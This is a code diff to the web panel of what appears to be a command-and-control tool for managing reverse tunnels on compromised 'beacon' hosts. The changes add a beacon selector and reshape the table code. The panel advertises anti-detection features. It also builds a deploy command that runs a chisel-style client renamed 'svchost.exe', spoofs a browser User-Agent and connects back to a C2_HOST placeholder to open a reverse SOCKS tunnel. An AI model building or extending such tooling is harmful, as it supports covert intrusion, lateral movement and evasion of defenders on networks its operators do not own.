@@ -79,7 +79,6 @@
 <!-- Evasion info banner -->
 <div style="padding:10px 14px; background:rgba(26,26,26,0.6); border:1px solid var(--border); margin-bottom:15px; font-family:'JetBrains Mono'; font-size:10px; display:flex; flex-wrap:wrap; align-items:center; gap:4px;">
     <span style="color:var(--accent);">ANTI-DETECTION:</span>
-    <span class="evasion-tag" style="color:#4CAF50; border-color:#4CAF50;">RANDOM_WS_PATH</span>
     <span class="evasion-tag" style="color:#2196F3; border-color:#2196F3;">CUSTOM_HEADERS</span>
     <span class="evasion-tag" style="color:#ff9800; border-color:#ff9800;">UNIQUE_AUTH</span>
     <span class="evasion-tag" style="color:#9c27b0; border-color:#9c27b0;">NO_DEFAULT_FINGERPRINT</span>
@@ -87,7 +86,7 @@
 </div>
 
 <div class="action-bar" style="flex-wrap:wrap;">
-    <button class="prts-btn" onclick="document.getElementById('create-proxy-modal').style.display='flex'">
+    <button class="prts-btn" onclick="openCreateProxyModal()">
         [+] CREATE_TUNNEL
     </button>
     <button class="prts-btn" onclick="fetchProxies()">
@@ -102,7 +101,7 @@
                 <th>ID</th>
                 <th>TYPE</th>
                 <th>PORT</th>
-                <th>WS_PATH</th>
+                <th>BEACON</th>
                 <th>STATUS</th>
                 <th>PID</th>
                 <th>CREATED</th>
@@ -143,8 +142,10 @@
                 <input type="text" id="proxy-remote" class="prts-input" placeholder="e.g. R:8080:10.0.0.1:80">
             </div>
             <div style="margin-bottom:12px;">
-                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">CLIENT_ID (optional):</label>
-                <input type="text" id="proxy-client-id" class="prts-input" placeholder="Associate with a beacon">
+                <label style="font-family:'JetBrains Mono'; font-size:10px; color:#888; display:block; margin-bottom:5px;">BEACON (optional):</label>
+                <select id="proxy-client-id" class="prts-select">
+                    <option value="">-- Select Beacon --</option>
+                </select>
             </div>
             <div style="margin-top:15px;">
                 <button type="submit" class="prts-btn" style="width:100%;">DEPLOY_TUNNEL</button>
@@ -155,6 +156,29 @@
 
 <script>
 (function() {
+    // Cache beacons for table display
+    var beaconMap = {};
+
+    window.openCreateProxyModal = async function() {
+        document.getElementById('create-proxy-modal').style.display = 'flex';
+        const sel = document.getElementById('proxy-client-id');
+        sel.innerHTML = '<option value="">-- Select Beacon --</option>';
+        try {
+            const resp = await fetch('/api/clients', { headers: { 'X-Requested-With': 'XMLHttpRequest' } });
+            const result = await resp.json();
+            const clients = result.data || [];
+            clients.forEach(function(c) {
+                beaconMap[c.id] = c;
+                const opt = document.createElement('option');
+                opt.value = c.id;
+                const dot = c.status === 'online' ? '● ' : '○ ';
+                const label = [c.hostname, c.username, c.ip].filter(Boolean).join(' / ');
+                opt.textContent = dot + label + '  [' + c.id + ']';
+                sel.appendChild(opt);
+            });
+        } catch(e) { console.error('load beacons failed:', e); }
+    };
+
     window.updateRemoteHint = function() {
         const type = document.getElementById('proxy-type').value;
         const remoteGroup = document.getElementById('remote-str-group');
@@ -178,51 +202,52 @@
                 tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color:#444; padding:30px;">NO_ACTIVE_TUNNELS</td></tr>';
                 return;
             }
-            tbody.innerHTML = proxies.map(p => {
+            tbody.innerHTML = proxies.map(function(p) {
                 const statusColor = p.status === 'running' ? 'var(--success)' : (p.status === 'dead' ? 'var(--danger)' : '#ff9800');
                 const typeLabel = {
                     'chisel_reverse_socks': 'REV_SOCKS5',
                     'chisel_reverse_port': 'REV_PORT_FWD',
                     'chisel_forward': 'FORWARD',
                 }[p.type] || p.type.toUpperCase();
-                return `
-                <tr>
-                    <td style="color:var(--accent); max-width:120px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${p.id}">${p.id.length > 12 ? p.id.substring(0,12)+'...' : p.id}</td>
-                    <td>${typeLabel}</td>
-                    <td>${p.listen_port}</td>
-                    <td style="color:#555; font-size:10px;">${p.ws_path || '-'}</td>
-                    <td style="color:${statusColor};">${(p.status || 'unknown').toUpperCase()}</td>
-                    <td style="color:#555;">${p.pid || '-'}</td>
-                    <td style="color:#666; font-size:10px;">${new Date(p.created_at).toLocaleString()}</td>
-                    <td>
-                        <button class="prts-btn" style="font-size:10px; padding:3px 8px; margin-right:4px;" onclick="showClientCmd('${p.id}')" title="Show deploy command"><i class="fas fa-terminal"></i></button>
-                        <button class="prts-btn" style="font-size:10px; padding:3px 8px;" onclick="deleteProxy('${p.id}')"><i class="fas fa-trash" style="color:var(--danger);"></i></button>
-                    </td>
-                </tr>
-            `}).join('');
+                const beaconInfo = p.client_id
+                    ? (beaconMap[p.client_id]
+                        ? (beaconMap[p.client_id].hostname || p.client_id)
+                        : p.client_id)
+                    : '-';
+                return '<tr>' +
+                    '<td style="color:var(--accent); max-width:120px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="' + p.id + '">' + (p.id.length > 12 ? p.id.substring(0,12)+'...' : p.id) + '</td>' +
+                    '<td>' + typeLabel + '</td>' +
+                    '<td>' + p.listen_port + '</td>' +
+                    '<td style="color:#888; font-size:10px;">' + escapeHtml(beaconInfo) + '</td>' +
+                    '<td style="color:' + statusColor + ';">' + (p.status || 'unknown').toUpperCase() + '</td>' +
+                    '<td style="color:#555;">' + (p.pid || '-') + '</td>' +
+                    '<td style="color:#666; font-size:10px;">' + new Date(p.created_at).toLocaleString() + '</td>' +
+                    '<td>' +
+                        '<button class="prts-btn" style="font-size:10px; padding:3px 8px; margin-right:4px;" onclick="showClientCmd(\'' + p.id + '\')" title="Show deploy command"><i class="fas fa-terminal"></i></button>' +
+                        '<button class="prts-btn" style="font-size:10px; padding:3px 8px;" onclick="deleteProxy(\'' + p.id + '\')"><i class="fas fa-trash" style="color:var(--danger);"></i></button>' +
+                    '</td>' +
+                '</tr>';
+            }).join('');
         } catch(e) { console.error(e); }
     };
 
     window.showClientCmd = function(proxyId) {
-        // Find proxy in cached data or refetch
         fetch('/api/proxies', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
-            .then(r => r.json())
-            .then(result => {
+            .then(function(r) { return r.json(); })
+            .then(function(result) {
                 const proxies = result.data || [];
-                const p = proxies.find(x => x.id === proxyId);
+                const p = proxies.find(function(x) { return x.id === proxyId; });
                 if (!p) return;
 
                 const binName = 'svchost.exe';
-                let cmd = '';
-                const wsPath = p.ws_path || '/ws';
                 const auth = p.auth_key || '';
                 const port = p.listen_port || 0;
 
-                cmd = binName + ' client'
+                var cmd = binName + ' client'
                     + ' --auth "' + auth + '"'
                     + ' --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
                     + ' --header "Accept: text/html,*/*"'
-                    + ' http://C2_HOST:' + port + wsPath;
+                    + ' http://C2_HOST:' + port + '/ws';
 
                 if (p.type === 'chisel_reverse_socks') {
                     cmd += ' R:socks';
@@ -245,11 +270,11 @@
         const text = box.textContent.replace('COPY', '').trim();
         navigator.clipboard.writeText(text.split('\n').pop());
         btn.textContent = 'COPIED!';
-        setTimeout(() => { btn.textContent = 'COPY'; }, 1500);
+        setTimeout(function() { btn.textContent = 'COPY'; }, 1500);
     };
 
     function escapeHtml(str) {
-        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
     }
 
     window.createProxy = async function() {
@@ -271,7 +296,6 @@
                 showNotification('TUNNEL_DEPLOYED: ' + (result.data.proxy ? result.data.proxy.id : ''));
                 fetchProxies();
 
-                // Show the client command
                 if (result.data.client_cmd) {
                     const area = document.getElementById('proxy-client-cmd-area');
                     const box = document.getElementById('proxy-client-cmd');
